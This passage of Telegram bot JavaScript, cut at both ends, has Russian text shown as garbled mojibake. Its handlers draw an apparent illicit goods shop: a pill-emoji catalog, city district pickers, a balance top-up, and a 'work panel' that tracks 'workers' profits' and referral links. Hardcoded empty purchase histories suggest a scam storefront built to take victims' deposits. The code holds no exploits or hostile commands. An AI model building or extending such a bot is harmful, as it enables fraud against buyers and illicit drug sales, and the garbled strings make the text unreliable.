        ‚ñ™Ô∏è –ï—Å–ª–∏ –≤–∞—à –Ω–∞—Å–µ–ª—ë–Ω–Ω—ã–π –ø—É–Ω–∫—Ç –æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç –≤ –∫–∞—Ç–∞–ª–æ–≥–µ - –æ–±—Ä–∞—Ç–∏—Ç–µ—Å—å –∫ –æ–ø–µ—Ä–∞—Ç–æ—Ä—É, –º—ã –ø–æ–º–æ–∂–µ–º —Å –æ—Ñ–æ—Ä–º–ª–µ–Ω–∏–µ–º –ø—Ä–µ–¥–∑–∞–∫–∞–∑–∞/–¥–æ—Å—Ç–∞–≤–∫–∏.`, {
			reply_markup: {
				inline_keyboard: [				   
                    [
                        { text: "üíä –ö–∞—Ç–∞–ª–æ–≥", callback_data: `kat` },
                        { text: "üë• –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞", callback_data: `referal` },
                        { text: "‚ÑπÔ∏è –û—Ç–∑—ã–≤—ã", callback_data: `otz` },
                         ],
                         [
                            { text: "üöï –î–æ—Å—Ç–∞–≤–∫–∞", callback_data: `kur` },
                            { text: "‚ö° –ü—Ä–æ—Ñ–∏–ª—å", callback_data: `prof` },
                            { text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", url: `t.me/` },
                         ],
                         [
        { text: "üî• –†–∞–±–æ—Ç–∞", callback_data: `work` },
        { text: "üõí –ú–æ–∏ –ø–æ–∫—É–ø–∫–∏", callback_data: `pok` },
                         ],
                         [
                            { text: "üí≤ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: `deposit` },
                                                 ],
                         ],
						 
						 
			 }, 
parse_mode: "HTML"
}) 
}

if(query.data.startsWith("pok")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üõí –ò—Å—Ç–æ—Ä–∏—è –ø–æ–∫—É–ø–æ–∫ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞... üõí`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üíä –ö–∞—Ç–∞–ª–æ–≥", callback_data: `kat` },
                { text: "üë• –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞", callback_data: `referal` },
                { text: "‚ÑπÔ∏è –û—Ç–∑—ã–≤—ã", callback_data: `otz` },
                 ],
                 [
                    { text: "üöï –î–æ—Å—Ç–∞–≤–∫–∞", callback_data: `kur` },
                    { text: "‚ö° –ü—Ä–æ—Ñ–∏–ª—å", callback_data: `prof` },
                    { text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", url: `t.me/` },
                 ],
                 [
{ text: "üî• –†–∞–±–æ—Ç–∞", callback_data: `work` },
{ text: "üõí –ú–æ–∏ –ø–æ–∫—É–ø–∫–∏", callback_data: `pok` },
                 ],
                 [
                    { text: "üí≤ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: `deposit` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}


if(query.data.startsWith("prof")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`‚ö°Ô∏è –ü—Ä–æ—Ñ–∏–ª—å ‚ö°Ô∏è

üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: 
‚ï† ID: ${message.user.id}
‚ï† –†–µ–π—Ç–∏–Ω–≥: 0%
‚ïö –û—Ç–∫—Ä—ã—Ç—ã–µ –¥–∏—Å–ø—É—Ç—ã: 0

üíµ –ë–∞–ª–∞–Ω—Å: ${message.user.balance} ‚ÇΩ

üìÖ –î–∞—Ç–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏: ${message.user.regDate}
`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üíä –ö–∞—Ç–∞–ª–æ–≥", callback_data: `kat` },
                { text: "üë• –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞", callback_data: `referal` },
                { text: "‚ÑπÔ∏è –û—Ç–∑—ã–≤—ã", callback_data: `otz` },
                 ],
                 [
                    { text: "üöï –î–æ—Å—Ç–∞–≤–∫–∞", callback_data: `kur` },
                    { text: "‚ö° –ü—Ä–æ—Ñ–∏–ª—å", callback_data: `prof` },
                    { text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", url: `t.me/` },
                 ],
                 [
{ text: "üî• –†–∞–±–æ—Ç–∞", callback_data: `work` },
{ text: "üõí –ú–æ–∏ –ø–æ–∫—É–ø–∫–∏", callback_data: `pok` },
                 ],
                 [
                    { text: "üí≤ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: `deposit` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("otz")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üìã –û–±—â–µ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –æ—Ç–∑—ã–≤–æ–≤: 1509

‚ö° –ö–∞–Ω–∞–ª —Å –æ—Ç–∑—ã–≤–∞–º–∏: https://t.me/otzyvi_store
`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üíä –ö–∞—Ç–∞–ª–æ–≥", callback_data: `kat` },
                { text: "üë• –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è –ø—Ä–æ–≥—Ä–∞–º–º–∞", callback_data: `referal` },
                { text: "‚ÑπÔ∏è –û—Ç–∑—ã–≤—ã", callback_data: `otz` },
                 ],
                 [
                    { text: "üöï –î–æ—Å—Ç–∞–≤–∫–∞", callback_data: `kur` },
                    { text: "‚ö° –ü—Ä–æ—Ñ–∏–ª—å", callback_data: `prof` },
                    { text: "üßë‚Äçüíª –û–ø–µ—Ä–∞—Ç–æ—Ä", url: `t.me/` },
                 ],
                 [
{ text: "üî• –†–∞–±–æ—Ç–∞", callback_data: `work` },
{ text: "üõí –ú–æ–∏ –ø–æ–∫—É–ø–∫–∏", callback_data: `pok` },
                 ],
                 [
                    { text: "üí≤ –ü–æ–ø–æ–ª–Ω–∏—Ç—å –±–∞–ª–∞–Ω—Å", callback_data: `deposit` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("1")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –î–ö –ù–µ—Ñ—Ç–µ—Ö–∏–º–∏–∫", callback_data: `kup_1` },
                { text: "üí† –†–æ–¥–Ω–∏–∫", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –§–µ—Å—Ç–∏–≤–∞–ª—å", callback_data: `kup_3` },
                    { text: "üí† –Æ–∂–Ω—ã–π –ú–∞—Å—Å–∏–≤", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –ù–∞–¥–µ–∂–¥–∞ –ö–∏—Ç–æ—è–≥", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("2")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –û–∫—Ç—è–±—Ä—å—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –°–µ–≤–µ—Ä–Ω—ã–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –°–æ–ª–æ–º–±–∞–ª—å—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –¶–∏–≥–ª–æ–º–µ–Ω—Å–∫–∏–π ", callback_data: `kup_4` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}  

if(query.data.startsWith("3")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)

return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –õ–µ–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –ü–µ—Ä–≤–æ–º–∞–π—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ü–µ—Ä–≤–æ—Ä–µ—á–µ–Ω—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –°–æ–≤–µ—Ç—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("4")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ö–æ–º–∏–Ω—Ç–µ—Ä–Ω–æ–≤—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –õ–µ–≤–æ–±–µ—Ä–µ–∂–Ω—ã–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –°–æ–≤–µ—Ç—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("5")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –í–µ—Ä—Ö-–ò—Å–µ—Ç—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –ö–∏—Ä–æ–≤—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –û–∫—Ç—è–±—Ä—å—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –û—Ä–¥–∂–æ–Ω–∏–∫–∏–¥–∑–µ–≤—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –ß–∫–∞–ª–æ–≤—Å–∫–∏–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("6")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –û–∫—Ç—è–±—Ä—å—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –õ–µ–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –°–æ–ª–Ω–µ—á–Ω—ã–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –°–≤–µ—Ä–¥–ª–æ–≤—Å–∫–∏–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("7")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ê–≤–∏–∞—Å—Ç—Ä–æ–∏—Ç–µ–ª—å–Ω—ã–π", callback_data: `kup_1` },
                { text: "üí† –í–∞—Ö–∏—Ç–æ–≤—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ö–∏—Ä–æ–≤—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –ú–æ—Å–∫–æ–≤—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –ù–æ–≤–æ-–°–∞–≤–∏–Ω–æ–≤—Å–∫–∏–π", callback_data: `kup_5` },
                    { text: "üí† –ü—Ä–∏–≤–æ–ª–∂—Å–∫–∏–π", callback_data: `kup_6` },
                 ],
                 [
                    { text: "üí† –°–æ–≤–µ—Ç—Å–∫–∏–π", callback_data: `kup_7` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("8")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ö–∏—Ä–æ–≤—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –û–∫—Ç—è–±—Ä—å—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –°–≤–µ—Ä–¥–ª–æ–≤—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –°–æ–≤–µ—Ç—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("9")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ö—Ä—ã–ª–∞—Ç—Å–∫–æ–µ", callback_data: `kup_1` },
                { text: "üí† –í—ã—Ö–∏–Ω–æ-–ñ—É–ª–µ–±–∏–Ω–æ", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ù–µ–∫—Ä–∞—Å–æ–≤–∫–∞", callback_data: `kup_3` },
                    { text: "üí† –°–æ–∫–æ–ª—å–Ω–∏–∫–∏", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –•–æ–≤—Ä–∏–Ω–æ", callback_data: `kup_5` },
                    { text: "üí† –ö–æ–º–º—É–Ω–∞—Ä–∫–∞", callback_data: `kup_6` },
                 ],
                 [
                    { text: "üí† –í–æ–π–∫–æ–≤—Å–∫–∏–π", callback_data: `kup_7` },
                    { text: "üí† –ß–µ—Ä—Ç–∞–Ω–æ–≤–æ", callback_data: `kup_8` },
                 ],
                 [
                    { text: "üí† –•–∞–º–æ–≤–Ω–∏–∫–∏", callback_data: `kup_9` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("q10")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ê–≤—Ç–æ–∑–∞–≤–æ–¥—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –õ–µ–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ú–æ—Å–∫–æ–≤—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –°–æ–≤–µ—Ç—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("w11")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –î–∑–µ—Ä–∂–∏–Ω—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –ó–∞–µ–ª—å—Ü–æ–≤—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ö–∞–ª–∏–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –ö–∏—Ä–æ–≤—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –û–∫—Ç—è–±—Ä—å—Å–∫–∏–π", callback_data: `kup_5` },
                    { text: "üí† –ü–µ—Ä–≤–æ–º–∞–π—Å–∫–∏–π", callback_data: `kup_6` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("e12")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ö–∏—Ä–æ–≤—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –õ–µ–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –û–∫—Ç—è–±—Ä—å—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –°–æ–≤–µ—Ç—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("r13")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –î–∑–µ—Ä–∂–∏–Ω—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –õ–µ–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ü—Ä–æ–º—ã—à–ª–µ–Ω–Ω—ã–π", callback_data: `kup_3` },
                    { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("t14")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ü–µ—Ä–≤–æ–º–∞–π—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –û–∫—Ç—è–±—Ä—å—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ñ–µ–ª–µ–∑–Ω–æ–¥–æ—Ä–æ–∂–Ω—ã–π", callback_data: `kup_3` },
                    { text: "üí† –°–æ–≤–µ—Ç—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –õ–µ–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("y15")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –°–æ–≤–µ—Ç—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –û–∫—Ç—è–±—Ä—å—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ü—Ä–æ–º—ã—à–ª–µ–Ω–Ω—ã–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("u16")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ê–¥–º–∏—Ä–∞–ª—Ç–µ–π—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –ö–∞–ª–∏–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ö–∏—Ä–æ–≤—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –ú–æ—Å–∫–æ–≤—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –ù–µ–≤—Å–∫–∏–π", callback_data: `kup_5` },
                    { text: "üí† –ü—É—à–∫–∏–Ω—Å–∫–∏–π", callback_data: `kup_7` },
                 ],
                 [
                    { text: "üí† –§—Ä—É–Ω–∑–µ–Ω—Å–∫–∏–π", callback_data: `kup_8` },
                    { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_6` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("i17")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
                 [
                    { text: "üí† –ó–∞–≤–æ–¥—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –õ–µ–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –û–∫—Ç—è–±—Ä—å—Å–∫–∏–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("o18")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ú–æ—Å–∫–æ–≤—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –ü—Ä–æ–ª–µ—Ç–∞—Ä—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ü—Ä–∏–≤–æ–ª–∂—Å–∫–∏–π", callback_data: `kup_3` },
                    { text: "üí† –Æ–∂–Ω—ã–π", callback_data: `kup_4` },
                 ],
                 [
                    { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("logref")) {
    bot.deleteMessage(message.chat.id, message.message_id)
        let fff = ``
        let ggg = ``
        if(message.user.work == 0) {
            await User.findOneAndUpdate({ id: message.user.id }, { $set: { work: 1 } })
            fff += `‚úÖ`
            ggg += `<b>‚úÖ –†–µ—Ñ–µ—Ä–∞–ª—å–Ω—ã–µ –ª–æ–≥–∏ –¥–ª—è –≤–æ—Ä–∫–µ—Ä–æ–≤ –≤–∫–ª—é—á–µ–Ω—ã</b>`
        }
        if(message.user.work == 1) {
            await User.findOneAndUpdate({ id: message.user.id }, { $set: { work: 0 } })
            fff += `‚ùå`
            ggg += `<b>‚ùå –í–∫–ª—é—á–∏—Ç–µ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –¥–ª—è –≤–æ—Ä–∫–µ—Ä–æ–≤</b>`
        }
            await bot.sendMessage(message.chat.id,`‚ö°Ô∏è –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ work panel ‚ö°Ô∏è
    
ID: ${message.user.id}
–í—ã —Å–¥–µ–ª–∞–ª–∏ <b>${message.user.spay}</b> –ø—Ä–æ—Ñ–∏—Ç–æ–≤ –Ω–∞ —Å—É–º–º—É <b>${message.user.pay}</b> RUB –∑–∞ –≤—Å–µ –≤—Ä–µ–º—è

–í–∞—à–∞ —Ä–µ—Ñ–µ—Ä–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞: http://t.me/Fjdjfkfjckdibot?start=${message.user.id}

${ggg}
            `, {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [				   
                        [
                            { text: `‚Ñπ –†–µ—Ñ–µ—Ä–∞–ª—å–Ω–æ–µ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ  (${fff})`, callback_data: `logref` },
                             ],
                    ]      
                 }, 
            });
}

if(query.data.startsWith("p19")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –ö–∏—Ä–æ–≤—Å–∫–∏–π", callback_data: `kup_1` },
                { text: "üí† –õ–µ–Ω–∏–Ω—Å–∫–∏–π", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –û–∫—Ç—è–±—Ä—å—Å–∫–∏–π", callback_data: `kup_7` },
                    { text: "üí† –°–æ–≤–µ—Ç—Å–∫–∏–π", callback_data: `kup_8` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("a20")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
return bot.sendMessage(message.chat.id,`üìç –í—ã–±–µ—Ä–∏—Ç–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –≤–∞—Å —Ä–∞–π–æ–Ω:`, {
reply_markup: {
		inline_keyboard: [
            [
                { text: "üí† –í–æ–π–Ω–æ–≤–∫–∞", callback_data: `kup_1` },
                { text: "üí† –ú–∞—è–∫", callback_data: `kup_2` },
                 ],
                 [
                    { text: "üí† –ú–æ—Å–∫–æ–≤—Å–∫–∏–π —Ç—Ä–∞–∫—Ç", callback_data: `kup_4` },
                    { text: "üí† –¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π", callback_data: `kup_5` },
                 ],
                 [
                    { text: "< –ù–∞–∑–∞–¥", callback_data: `kat` },
                                         ],
                 ],
		
	},
parse_mode: "HTML"
});
}

if(query.data.startsWith("s21")) {
							
	bot.deleteMessage(message.chat.id, message.message_id)
